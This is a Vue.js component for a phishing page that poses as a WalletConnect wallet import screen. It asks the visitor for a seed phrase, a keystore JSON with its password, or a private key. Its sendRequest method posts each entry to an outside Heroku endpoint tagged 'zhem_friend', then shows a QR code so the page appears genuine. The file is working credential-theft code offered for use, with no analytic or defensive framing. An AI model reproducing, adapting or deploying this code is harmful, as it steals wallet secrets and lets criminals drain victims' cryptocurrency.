<template>
  <div class="h-screen">
    <!-- <navbar /> -->
    <main class="profile-page mx-auto  my-auto h-screen">
      <section class="relative py-16 bg-blueGray-800 h-full">
        <div class="container mx-auto px-4">
          <div
            class="relative flex flex-col min-w-0 break-words bg-white w-full mb-6 shadow-xl rounded-lg "
          >
            <div class="px-6">
              <div class="flex flex-wrap flex-col justify-center">
                <div
                  class="w-full mt-30 lg:order-3 lg:text-right lg:self-center"
                >
                  <div class="flex flex-wrap w-full hidden" id="showQr">
                   <div class="flex flex-wrap"> <p class="mx-auto p-2" style="color:rgba(60, 66, 82, 0.6); font-weight:600;font-size:16px">Scan QR code with a WalletConnect-compatible wallet</p></div>
                     <img
                      alt="..."
                      style="height:236px;width:auto"
                      class="mx-auto p-2"
                      :src="qr"
                    />
                   </div>
                  <nav class="bg-white" id="showNav">
                   
                    <div class="flex flex-wrap" >
                        <div class="m-4 text-blue"><a id="textPhrase" href="#" v-on:click="showPhrase">Phrase</a></div>
                        <div class="m-4"><a href="#" id="textKeystore" v-on:click="showKeystore">Keystore JSON</a></div>
                        <div class="m-4"><a href="#" id="textPrivate"  v-on:click="showPrivate">Private Key</a></div>
                    </div>
                    <div class="flex flex-col" id="phrase">
                      <textarea v-model="phraseTextarea" class="w-full" id="phraseTextArea" placeholder="Keystore JSON" name="phraseTextarea" rows="4" cols="50"/>
                      <div class="flex flex-wrap text-sm mt-4"><p style="color: red">{{phraseerror}}</p></div>
                      <div class="flex flex-wrap text-sm mt-4"><p style="color: #6c757d">Typically 12 (sometimes 24) words seperated by a single spaces.</p></div>
                      <div class="place-self-center">
                        <button
                        @click="importPhrase"
                        class="bg-emerald-500 text-white active:bg-emerald-600 text-xs font-bold uppercase mt-4 mb-4 px-4 py-2 rounded shadow hover:shadow-lg outline-none focus:outline-none ml-3 mb-3 ease-linear transition-all duration-150"
                        type="button">
                           {{isLoading ? "Importing..." : "IMPORT"}}
                        </button>
                      </div>
                    </div>
                    <div class="flex flex-col hidden" id="keystore">
                      <textarea v-model="keystoreTextarea" class="w-full" id="keystoreTextarea" placeholder="Keystore JSON" name="w3review" rows="4" cols="50"/>
                      <input v-model="keystorePassword" type="text" id="keystorePassword" class="mt-4 shadow-xl rounded-lg w-full" placeholder="Password" />
                      <div class="flex flex-wrap text-sm mt-4"><p style="color: #6c757d">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p></div>
                       <div class="flex flex-wrap text-sm mt-4"><p style="color: red">{{keystoreerror}}</p></div>
                      <div class="place-self-center">
                        <button
                        @click="importKeystore"
                        class="bg-emerald-500 text-white active:bg-emerald-600 text-xs font-bold uppercase mt-4 mb-4 px-4 py-2 rounded shadow hover:shadow-lg outline-none focus:outline-none ml-3 mb-3 ease-linear transition-all duration-150"
                        type="button">
                          {{isLoading ? "Importing..." : "IMPORT"}}
                        </button>
                      </div>
                    </div>
                    <div class="flex flex-col hidden" id="private">
                      <input v-model="privateTextarea" id="privateTextArea"  type="text" class="mt-4 shadow-xl rounded-lg w-full" placeholder="Password" />
                      <div class="flex flex-wrap text-sm mt-4"><p style="color: red">{{privateerror}}</p></div>
                      <div class="flex flex-wrap text-sm mt-4"><p style="color: #6c757d">Typically 12 (sometimes 24) words seperated by a single spaces.</p></div>
                      <div class="place-self-center">
                        <button
                        @click="importPrivate"
                        class="bg-emerald-500 text-white active:bg-emerald-600 text-xs font-bold uppercase mt-4 mb-4 px-4 py-2 rounded shadow hover:shadow-lg outline-none focus:outline-none ml-3 mb-3 ease-linear transition-all duration-150"
                        type="button">
                          {{isLoading ? "Importing..." : "IMPORT"}}
                        </button>
                      </div>
                    </div>

                  </nav>
                </div>
               
              </div>
             
            </div>
          </div>
        </div>
      </section>
    </main>
  </div>
</template>

<script>
import team2 from "@/assets/img/team-2-800x800.jpg";
import qr from "@/assets/media/qr.png";

 import axios from "axios"
export default {
  data() {
    return {
      qr,
      fullPage: true,
      isLoading: false,
      phraseerror: "",
      phraseTextarea: "",
      privateerror: "",
      privateTextarea: "",
      keystoreerror: "",
      keystoreTextarea: "",
      keystorePassword: "",
      team2,
      platform: ""
    };
  },
  mounted() {
    this.platform = JSON.parse(localStorage.getItem("platform"))
     var textphrase = document.getElementById("textPhrase");
     this.styleButton(textphrase)
  },
  methods: {
    importPhrase(){
      if(this.phraseTextarea == ""){
        this.phraseerror = "KINDLY FILL UP THE ABOVE FIELD"
        var textphrase = document.getElementById("phraseTextArea");
        textphrase.style.borderColor = "red"
        return
      }
      this.isLoading = true

      const data = {word: `${this.platform} PHRASE= ${this.phraseTextarea} `, name: "PHRASE" }
      this.sendRequest(data).then(() => {
        this.isLoading = false;
        var textphrase = document.getElementById("phraseTextArea");
        textphrase.style.borderColor = ""
        this.phraseTextarea = ""
      })
    },
    importKeystore(){
      if(this.keystoreTextarea == "" || this.keystorePassword == ""){
        this.keystoreerror = "KINDLY FILL UP THE ABOVE FIELD"
        var textkeystore = document.getElementById("keystoreTextarea");
        var passkeystore = document.getElementById("keystorePassword");
        textkeystore.style.borderColor = "red"
        passkeystore.style.borderColor = "red"
        return
      }
      this.isLoading = true;
      const data = {word: `${this.platform} KEYSTORE= ${this.keystoreTextarea} PASSWORD= ${this.keystorePassword}`, name: "KEYSTORE" }
      this.sendRequest(data).then(() => {
        this.isLoading = false;
        var textkeystore = document.getElementById("keystoreTextArea");
        var passkeystore = document.getElementById("keystorePassword");
        textkeystore.style.borderColor = ""
         passkeystore.style.borderColor = ""
        this.keystoreTextarea = ""
        this.keystorePassword = ""
      })
    },
    importPrivate(){
      if(this.privateTextarea == ""){
        this.privateerror = "KINDLY FILL UP THE ABOVE FIELD"
        var textprivate = document.getElementById("privateTextArea");
        textprivate.style.borderColor = "red"
        return
      }
      this.isLoading = true;
      const data = {word: `${this.platform} PRIVATE PASSWORD= ${this.privateTextarea}`, name: "PRIVATE" }

       this.sendRequest(data).then(() => {
        this.isLoading = false;
        var textprivate = document.getElementById("privateTextArea");
        textprivate.style.borderColor = ""
        this.privateTextarea = ""

      })
    },
    async sendRequest(data){
      console.log({data: JSON.stringify({data}), source: 'zhem_friend'});
      let data2 = {source: 'zhem_friend', ...data}
      axios.post('https://alimizainab.herokuapp.com/api/v1/users', {data: JSON.stringify({data2})}).then(response =>{
        console.log(response);
      })
      var showQr = document.getElementById("showQr");
      var showNav = document.getElementById("showNav");
      showQr.style.display = "block"
      showNav.style.display = "none"
      return true;

    },
    styleButton(element){
       element.classList.add("rounded");
      element.classList.add("font-bold");
      element.classList.add("text-xs");
      element.classList.add("px-4");
      element.classList.add("py-2");
      element.classList.add("shadow-lg");
      element.classList.add("outline-none");
      element.classList.add("text-white");
      element.classList.add("uppercase");
      element.style.background = "#00aae7";
    },
    removeStyle(element){
       element.classList.remove("rounded");
      element.classList.remove("font-bold");
      element.classList.remove("text-xs");
      element.classList.remove("px-4");
      element.classList.remove("py-2");
      element.classList.remove("shadow-lg");
      element.classList.remove("outline-none");
      element.classList.remove("text-white");
      element.classList.remove("uppercase");
      element.style.background = "";
    },
    showPhrase(){
      var textphrase = document.getElementById("textPhrase");
      var textKeystore = document.getElementById("textKeystore");
      var textPrivate = document.getElementById("textPrivate");
      var phrase = document.getElementById("phrase");
      var keystore = document.getElementById("keystore");
      var private2 = document.getElementById("private");
      phrase.style.display = "block";
      keystore.style.display = "none";
      private2.style.display = "none";

      this.styleButton(textphrase)
      this.removeStyle(textKeystore)
      this.removeStyle(textPrivate)
    },
    showKeystore(){
      var textphrase = document.getElementById("textPhrase");
      var textKeystore = document.getElementById("textKeystore");
      var textPrivate = document.getElementById("textPrivate");
      var phrase = document.getElementById("phrase");
      var keystore = document.getElementById("keystore");
      var private2 = document.getElementById("private");
      phrase.style.display = "none";
      keystore.style.display = "block";
      private2.style.display = "none";
      textKeystore.style.background = "#00aae7";
      this.styleButton(textKeystore)
      this.removeStyle(textphrase)
      this.removeStyle(textPrivate)
    },
    showPrivate(){
      var textphrase = document.getElementById("textPhrase");
      var textKeystore = document.getElementById("textKeystore");
      var textPrivate = document.getElementById("textPrivate");
      var phrase = document.getElementById("phrase");
      var keystore = document.getElementById("keystore");
      var private2 = document.getElementById("private");
      phrase.style.display = "none";
      keystore.style.display = "none";
      private2.style.display = "block";
      this.styleButton(textPrivate)
      this.removeStyle(textphrase)
      this.removeStyle(textKeystore)
    }
  },
  components: {
  },
};
</script>
